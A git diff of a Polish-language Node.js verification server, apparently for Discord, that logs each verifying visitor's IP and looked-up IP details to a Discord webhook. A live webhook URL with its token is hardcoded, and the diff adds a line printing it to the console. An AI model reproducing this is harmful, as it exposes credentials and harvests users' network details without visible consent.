@@ -64,11 +64,11 @@ app.post('/api/register-code', (req, res) => {
     }
   }
   
-  console.log(`✅ Kod ${code} zarejestrowany dla ${userId}`);
+  console.log(`📝 Kod ${code} zarejestrowany dla ${userId}`);
   res.json({ success: true });
 });
 
-// Strona weryfikacji
+// Strona weryfikacji - TYLKO KOD, ID Z LINKU
 app.get('/', (req, res) => {
   const { code, userId } = req.query;
   
@@ -251,7 +251,7 @@ app.get('/', (req, res) => {
           
           // Auto-weryfikacja jeśli mamy i kod i userId
           if(code && userId) {
-            setTimeout(verify, 500);
+            verify();
           }
         }
       </script>
@@ -265,56 +265,32 @@ app.post('/api/verify', async (req, res) => {
   const { code, userId } = req.body;
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
-  console.log(`🔍 Próba weryfikacji: code=${code}, userId=${userId}, ip=${clientIp}`);
+  console.log(`🔍 Próba weryfikacji: kod=${code}, userId=${userId}, ip=${clientIp}`);
   
   if (!code || !userId) {
+    console.log('❌ Brak kodu lub userId');
     return res.json({ success: false, message: 'Brak kodu lub userId' });
   }
   
   // Sprawdź czy kod istnieje i jest ważny
   const stored = validCodes.get(code);
-  if (!stored) {
-    console.log(`❌ Kod ${code} nie istnieje`);
-    return res.json({ success: false, message: 'Nieprawidłowy kod!' });
-  }
-  
-  if (stored.userId !== userId) {
-    console.log(`❌ Kod ${code} należy do innego użytkownika (${stored.userId} != ${userId})`);
-    return res.json({ success: false, message: 'Kod nie pasuje do tego użytkownika!' });
-  }
-  
-  if (stored.expires < Date.now()) {
-    console.log(`❌ Kod ${code} wygasł`);
-    validCodes.delete(code);
-    return res.json({ success: false, message: 'Kod wygasł!' });
+  if (!stored || stored.userId !== userId || stored.expires < Date.now()) {
+    console.log(`❌ Nieprawidłowy kod: ${code}`);
+    return res.json({ success: false, message: 'Nieprawidłowy lub wygasły kod!' });
   }
   
   // Usuń kod (jednorazowy)
   validCodes.delete(code);
-  console.log(`✅ Kod ${code} zweryfikowany pomyślnie dla ${userId}`);
   
   // Pobierz info o IP
   const ipInfo = await getIPInfo(clientIp);
+  console.log(`🌐 Info o IP: ${JSON.stringify(ipInfo)}`);
   
-  // === WAŻNE: Wyślij informację do bota przez webhook ===
+  // Wyślij log na Discorda przez webhook - TYLKO EMBED, BEZ JSONA!
   try {
-    // Webhook, który bot nasłuchuje (ten sam co w VERIFY_LOG_CHANNEL_ID)
-    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
-      content: JSON.stringify({
-        type: 'verification',
-        success: true,
-        userId: userId,
-        ipInfo: ipInfo
-      })
-    });
-    console.log(`📤 Wysłano webhook do bota dla ${userId}`);
-  } catch (error) {
-    console.error('❌ Błąd wysyłania webhooka do bota:', error.message);
-  }
-  
-  // Wyślij też ładny embed na kanał logów
-  try {
-    await axios.post('https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
+    const webhookUrl = 'https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z';
+    
+    const webhookData = {
       embeds: [{
         title: '✅ Nowa weryfikacja',
         color: 0x00ff00,
@@ -339,9 +315,16 @@ app.post('/api/verify', async (req, res) => {
         timestamp: new Date().toISOString(),
         footer: { text: 'SecretC2 - System weryfikacji' }
       }]
-    });
+    };
+    
+    const webhookResponse = await axios.post(webhookUrl, webhookData);
+    console.log(`✅ Embed wysłany, status: ${webhookResponse.status}`);
   } catch(e) {
-    console.error('Błąd webhooka embed:', e.message);
+    console.error('❌ BŁĄD WEBHOOKA:', e.message);
+    if (e.response) {
+      console.error('Status błędu:', e.response.status);
+      console.error('Dane błędu:', e.response.data);
+    }
   }
   
   res.json({ 
@@ -353,4 +336,5 @@ app.post('/api/verify', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Serwer weryfikacji działa na porcie ${PORT}`);
+  console.log(`🌐 Webhook URL: https://discord.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z`);
 });
